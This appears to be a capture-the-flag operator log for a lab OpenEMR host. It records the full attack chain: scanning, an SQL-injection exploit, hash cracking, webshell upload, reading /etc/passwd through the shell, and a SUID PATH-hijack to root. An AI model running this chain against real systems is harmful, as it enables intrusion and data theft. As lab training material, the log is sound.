# Operator Activity Log - CIP-A105 CTF2 Black Forge

| Timestamp | System | Action/Command | Purpose | Outcome |
|-----------|--------|------------------|---------|---------|
| 2026-09-19 09:59:35 | Kali | sudo nmap -sV -p- 192.168.254.128 | Full port and service scan of target | 21/tcp ftp, 80/tcp http open |
| 2026-09-19 10:08:48 | Kali | sudo nmap -sn 192.168.254.0/24 | Discover target on isolated subnet | Target found at 192.168.254.128 |
| 2026-09-19 10:08:48 | Kali | ping 192.168.254.128 | Confirm target reachability | 100 percent reply, 0 percent loss |
| 2026-09-19 10:08:48 | Kali | sudo nmap -sV -p- 192.168.254.128 -oN nmap_full_tcp_phase1.txt | Full TCP port and service scan, saved to file | 21/tcp ftp ProFTPD 1.3.3d, 80/tcp http Apache 2.2.17 |
| 2026-09-19 10:12:01 | Kali | ftp 192.168.254.128 (anonymous login attempt) | Check for anonymous FTP access | Login failed - 530 Login incorrect, anonymous access not permitted |
| 2026-09-19 10:12:01 | Kali | curl -s -D - http://192.168.254.128/ | Retrieve HTTP response headers from web root | 200 OK, Apache 2.2.17, Content-Length 5031, last modified 2018-01-06 |
| 2026-09-19 10:14:40 | Kali | curl -s http://192.168.254.128/robots.txt | Passive check for disclosed paths before active enumeration | Standard default robots.txt, no target-specific paths disclosed |
| 2026-09-19 10:23:31 | Kali | curl status check on /addon-modules/ and /admin/ | Verify robots.txt disclosed paths before brute-force | /addon-modules/ returns 403 Forbidden, /admin/ returns 404 Not Found |
| 2026-09-19 10:49:06 | Kali | gobuster dir -u http://192.168.254.128/ -w directory-list-2.3-medium.txt -x php,html | Active content discovery on web root | 12 paths found; gitweb, phpMyAdmin, server-status flagged for further review |
| 2026-09-19 10:50:47 | Kali | curl -s on /vendor/ and /gitweb/ | Inspect flagged directories for listing/disclosure | Both return 403 Forbidden, no directory listing or content exposed |
| 2026-09-19 10:56:24 | Kali | gobuster dir -u http://192.168.254.128/ -w directory-list-lowercase-2.3-medium.txt -x php,html | Broaden content discovery with lowercase wordlist | No new paths found beyond first scan |
| 2026-09-19 22:19:57 | Host/Kali | Added NAT adapter to Kali, renewed DHCP on eth0 | Restore internet access for package installation | eth0 obtained NAT IP, DNS resolution working |
| 2026-09-19 22:19:57 | Kali | sudo apt install seclists -y | Install larger/varied wordlists for content discovery | seclists installed successfully |
| 2026-09-19 22:44:45 | Kali | gobuster dir -u http://192.168.254.128/ -w DirBuster-2007_directory-list-2.3-big.txt -x php,html | Escalated content discovery with larger wordlist | New path discovered: /openemr/ - application not found by smaller wordlists |
| 2026-09-19 22:46:17 | Kali | curl -s http://192.168.254.128/openemr/ | Inspect OpenEMR landing page redirect | Redirects to interface/login/login_frame.php - confirms OpenEMR application |
| 2026-09-19 22:49:17 | Kali | curl login_frame.php, version.php, login.php | Fingerprint OpenEMR version and inspect login mechanism | jQuery 1.4.3 in use, client-side MD5/SHA1 hashing, commented demo credential hint present in page source |
| 2026-09-19 22:52:40 | Kali | curl requests to VERSION, version.txt, dbupgrade.php | Attempt direct version fingerprinting via common disclosure paths | All three returned 404, not accessible |
| 2026-09-19 22:52:40 | Kali | curl POST to main_screen.php with admin/pass credentials | Test commented demo credentials found in login page source | Empty response body, inconclusive - requires header/cookie inspection |
| 2026-09-19 22:55:47 | Kali | curl -i POST login test with admin/pass | Determine login result via headers/redirect | Failed - redirected to login_screen.php?error=1, admin/pass not valid. X-Powered-By discloses PHP 5.3.3 |
| 2026-09-19 23:13:31 | Kali | searchsploit openemr | Research applicable vulnerabilities against identified application | 38 results returned, requires cross-referencing against version indicators |
| 2026-09-19 23:18:59 | Kali | searchsploit -x php/webapps/49742.py and 17998.txt | Review exploit details and cross-reference against enumerated endpoint validateUser.php | 49742.py confirmed unauthenticated SQLi against validateUser.php?u= matching Phase 2 findings, selected as primary attack vector |
| 2026-09-19 23:36:43 | Kali | python3 49742.py | Execute unauthenticated SQLi against validateUser.php to extract credentials | Successfully extracted 2 user credential pairs with SHA1 password hashes |
| 2026-09-19 23:40:19 | Kali | john and hashcat against openemr_hashes.txt with rockyou.txt | Crack extracted SHA1 password hashes | Both hashes cracked: admin:ackbar and medical:medical, recovered in under 1 second |
| 2026-09-19 23:43:08 | Kali | curl POST with clearPass - both returned error=1 | Verify cracked credentials against OpenEMR login | Failed - application uses client-side SHA1 hashing before submission, authPass field requires pre-hashed value not cleartext |
| 2026-09-19 23:43:41 | Kali | curl POST authPass with SHA1 hash for admin:ackbar | Authenticate to OpenEMR using pre-hashed credential bypassing client-side JS | HTTP 200 OK - admin session established |
| 2026-09-19 23:43:41 | Kali | curl POST authPass with SHA1 hash for medical:medical | Authenticate to OpenEMR using pre-hashed credential bypassing client-side JS | HTTP 200 OK - medical session established |
| 2026-09-19 23:46:04 | Kali | curl ofc_upload_image.php with admin session | Test authenticated file upload endpoint for shell upload vector | 404 Not Found - endpoint not present on this install |
| 2026-09-19 23:51:34 | Kali | searchsploit -x php/remote/24529.rb | Review OpenEMR file upload module for alternative upload path | Module targets /openemr/library/openflashchart/php-ofc-library/ofc_upload_image.php - different from path tested earlier |
| 2026-09-19 23:51:34 | Kali | searchsploit proftpd 1.3.3 | Research ProFTPD version for applicable exploits | Backdoor affects 1.3.3c only - 1.3.3d was released to patch it. IAC overflow covers up to 1.3.3b only. ProFTPD not viable as attack vector. |
| 2026-09-19 23:52:52 | Kali | curl ofc_upload_image.php via correct openflashchart path | Verify unauthenticated file upload endpoint presence | HTTP 200, Saving your image to response confirmed - endpoint present and responsive, no authentication required |
| 2026-09-19 23:56:21 | Kali | curl POST shell.php to ofc_upload_image.php | Upload PHP webshell via openflashchart endpoint | Upload attempted but failed - cant open file error indicates tmp-upload-images directory not writable or missing |
| 2026-09-19 23:58:13 | Kali | curl GET tmp-upload-images directory | Verify upload directory existence | 404 Not Found - tmp-upload-images directory does not exist, openflashchart upload vector not viable |
| 2026-09-20 00:01:24 | Kali | searchsploit -x php/webapps/28329.txt | Review authenticated file upload vector for shell access | manage_site_files.php allows authenticated arbitrary file upload - admin session available |
| 2026-09-20 00:01:24 | Kali | curl edit_globals.php with admin cookie | Verify authenticated admin panel access | HTTP 200 OK confirmed, admin panel accessible |
| 2026-09-20 00:02:51 | Kali | curl POST to manage_site_files.php with shell.php | Upload PHP webshell via authenticated arbitrary file upload | Upload successful - shell.php confirmed in /var/www/html/openemr/sites/default/images/ |
| 2026-09-20 00:05:09 | Kali | curl shell.php?cmd=id | Confirm RCE and web server execution context | Pending output |
| 2026-09-20 00:05:09 | Kali | curl shell.php?cmd=uname -a | Confirm target OS and kernel version | Linux 2.6.38.8-pclos3.bfs, i686, July 2011, 32-bit |
| 2026-09-20 00:05:09 | Kali | curl shell.php?cmd=cat /etc/passwd | Enumerate system users via RCE | 3 interactive users: medical, almirant, root. mysql has bash shell. |
| 2026-09-20 07:13:00 | Kali | uname -a, /etc/issue, /proc/version, hostname via bind shell | Host identity enumeration | Linux 2.6.38.8-pclos3.bfs i686, PCLinuxOS ZEN-mini 2011, 32-bit |
| 2026-09-20 07:13:00 | Kali | cat /etc/passwd, /etc/group, last, who via bind shell | User and group enumeration | 3 interactive users: root, medical, almirant. almirant is primary user. |
| 2026-09-20 07:13:00 | Kali | ifconfig, netstat, cat /etc/hosts via bind shell | Network state enumeration | Single interface eth1 192.168.254.128, loopback only |
| 2026-09-20 07:13:00 | Kali | ps aux, ls /etc/init.d via bind shell | Running services enumeration | Shorewall firewall active - explains blocked reverse shell. sshd, mysqld, crond, proftpd, httpd all running. |
| 2026-09-20 07:15:25 | Kali | find SUID/SGID, cat sqlconf.php, crontab via bind shell | Enumerate privilege escalation vectors, credentials, scheduled jobs | healthcheck binary has both SUID and SGID bits set - non-standard, high interest. MySQL creds openemr:openemr found. Standard cron only. |
| 2026-09-20 07:24:39 | Kali | strings /usr/bin/healthcheck | Analyse SUID binary for PATH hijack vulnerability | Binary calls ifconfig without absolute path via system() - PATH hijack confirmed viable |
| 2026-09-20 07:24:40 | Kali | echo payload > /tmp/ifconfig && export PATH=/tmp:$PATH && /usr/bin/healthcheck | Exploit SUID healthcheck via PATH hijack to create SUID rootbash | rootbash created with euid=0(root) confirmed |
| 2026-09-20 07:24:40 | Kali | /tmp/rootbash -p -c 'cat /root/root.txt' | Retrieve root flag as proof of objective completion | root flag: eaff25eaa9ffc8b62e3dfebf70e83a7b |
| 2026-09-20 07:24:40 | Kali | cat /home/almirant/user.txt | Retrieve user flag | user flag: d41d8cd98f00b204e9800998ecf8427e |
| 2026-09-20 07:30:35 | Kali | Documented remediation roadmap across 8 findings | Phase 7 - translate findings to prioritised remediation actions | All findings documented with immediate, short-term, and strategic actions. Session ready for withdrawal. |
| 2026-09-20 07:48:09 | Kali | Created all mandatory deliverables in 05_report_drafts/ | Generate submission-ready report documents per brief requirements | Executive report, technical report, risk register, lessons learned, attack path diagram, evidence appendix all created |
